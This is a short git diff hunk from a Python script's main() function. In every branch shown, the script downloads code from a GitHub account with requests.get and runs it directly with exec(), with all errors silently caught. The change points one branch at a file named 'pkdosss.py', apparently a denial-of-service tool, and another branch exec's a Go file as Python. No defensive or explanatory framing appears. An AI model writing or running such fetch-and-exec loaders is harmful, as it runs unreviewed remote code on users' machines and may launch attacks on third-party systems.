@@ -71,7 +71,7 @@ def main():
 
     try:
         if abc == 1:
-            exec(requests.get("https://raw.githubusercontent.com/Kenne400k/nxt/main/pk.py").text)
+            exec(requests.get("https://github.com/Kenne400k/nxt/blob/main/pkdosss.py").text)
         elif abc == 2:
             exec(requests.get("https://raw.githubusercontent.com/Kenne400k/nxt/main/pk1.go").text)
     except:
